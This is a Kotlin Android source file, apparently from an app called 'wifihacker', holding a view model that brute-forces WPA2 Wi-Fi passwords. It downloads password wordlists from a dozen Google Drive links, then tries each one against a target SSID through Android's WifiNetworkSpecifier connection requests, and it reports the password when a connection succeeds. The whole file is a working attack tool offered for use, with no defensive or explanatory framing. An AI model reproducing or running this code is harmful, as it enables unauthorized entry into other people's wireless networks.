package com.hereliesaz.wifihacker

import android.app.Application
import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiNetworkSpecifier
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import kotlin.coroutines.cancellation.CancellationException

class CrackViewModel(application: Application) : AndroidViewModel(application) {

    private val _status = MutableStateFlow("Idle")
    val status: StateFlow<String> = _status

    private val _progress = MutableStateFlow(0)
    val progress: StateFlow<Int> = _progress

    private var crackingJob: Job? = null
    private val connectivityManager = application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

    fun startCracking(ssid: String, detail: String) {
        // Cancel any previous job
        crackingJob?.cancel()
        crackingJob = viewModelScope.launch(Dispatchers.IO) {
            try {
                _status.value = "Downloading dictionaries..."
                _progress.value = 0
                val passwords = downloadDictionaries()
                if (passwords.isEmpty()) {
                    _status.value = "Failed to download dictionaries."
                    return@launch
                }
                _status.value = "Passwords loaded, cracking now..."

                for ((index, password) in passwords.withIndex()) {
                    if (!isActive) throw CancellationException()

                    _status.value = "Trying password: $password"
                    _progress.value = (index + 1) * 100 / passwords.size

                    val success = tryPassword(ssid, password)

                    if (success) {
                        _status.value = "Password found: $password"
                        return@launch
                    }
                }
                _status.value = "Failed to crack password."
            } catch (e: CancellationException) {
                _status.value = "Cracking cancelled."
            } catch (e: Exception) {
                _status.value = "An error occurred: ${e.message}"
                e.printStackTrace()
            }
        }
    }

    private suspend fun tryPassword(ssid: String, password: String): Boolean {
        return kotlin.coroutines.suspendCancellableCoroutine { continuation ->
            val specifier = WifiNetworkSpecifier.Builder()
                .setSsid(ssid)
                .setWpa2Passphrase(password)
                .build()

            val request = NetworkRequest.Builder()
                .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
                .setNetworkSpecifier(specifier)
                .build()

            val networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    super.onAvailable(network)
                    connectivityManager.unregisterNetworkCallback(this)
                    if (continuation.isActive) {
                        continuation.resume(true, null)
                    }
                }

                override fun onUnavailable() {
                    super.onUnavailable()
                    connectivityManager.unregisterNetworkCallback(this)
                    if (continuation.isActive) {
                        continuation.resume(false, null)
                    }
                }
            }

            continuation.invokeOnCancellation {
                connectivityManager.unregisterNetworkCallback(networkCallback)
            }

            connectivityManager.requestNetwork(request, networkCallback, 5000) // 5 second timeout
        }
    }

    override fun onCleared() {
        super.onCleared()
        crackingJob?.cancel()
    }

    private suspend fun downloadDictionaries(): List<String> {
        val passwords = mutableListOf<String>()
        val urls = listOf(
            "https://drive.google.com/file/d/12ohN_3CktkNUGlDwHP-hzawpaqTEaMem/view?usp=drive_link",
            "https://drive.google.com/file/d/1FHAd6hnQoyKtoJzqak3f1koFQ-jlw65P/view?usp=drive_link",
            "https://drive.google.com/file/d/1xF_-ZLONJE9GkeHMp9GxRJpt3BqlCgO-/view?usp=drive_link",
            "https://drive.google.com/file/d/1Tn09w5kzccSZra13iGB5HpD7zMWwVRVS/view?usp=drive_link",
            "https://drive.google.com/file/d/11uWVOmuMPl-564mKz996uNmm3OVGpBqq/view?usp=drive_link",
            "https://drive.google.com/file/d/1G4pkjSNoKJWyjoI8l5-iCPdWlWyLKcBn/view?usp=drive_link",
            "https://drive.google.com/file/d/168ednlVlBdIL0NrJqFBKusmLG5uRSI5I/view?usp=drive_link",
            "https://drive.google.com/file/d/1_T-B7g4elsKb_qIYTqr-Jl8uxKYS1943/view?usp=drive_link",
            "https://drive.google.com/file/d/1JMoCTjOW1luWsrhgGp4kPWi4EJCnIakC/view?usp=drive_link",
            "https://drive.google.com/file/d/1GM8SV6hxPx3mTtwdNjSnjJyyFydT8ixP/view?usp=drive_link",
            "https://drive.google.com/file/d/1VC9TOuWdmAtjD7Z4Yb29pK7-SELOC-bM/view?usp=drive_link",
            "https://drive.google.com/file/d/1lSLJquH6WPGp_3yxVsODL1x3ZYlUYihw/view?usp=drive_link"
        )

        for (url in urls) {
            try {
                val fileId = url.split("/d/")[1].split("/")[0]
                val downloadUrl = "https://drive.google.com/uc?export=download&id=$fileId"
                val u = URL(downloadUrl)
                val c = u.openConnection() as HttpURLConnection
                c.requestMethod = "GET"
                c.connect()
                val reader = BufferedReader(InputStreamReader(c.inputStream))
                var line: String?
                while (reader.readLine().also { line = it } != null) {
                    passwords.add(line!!)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        return passwords
    }
}
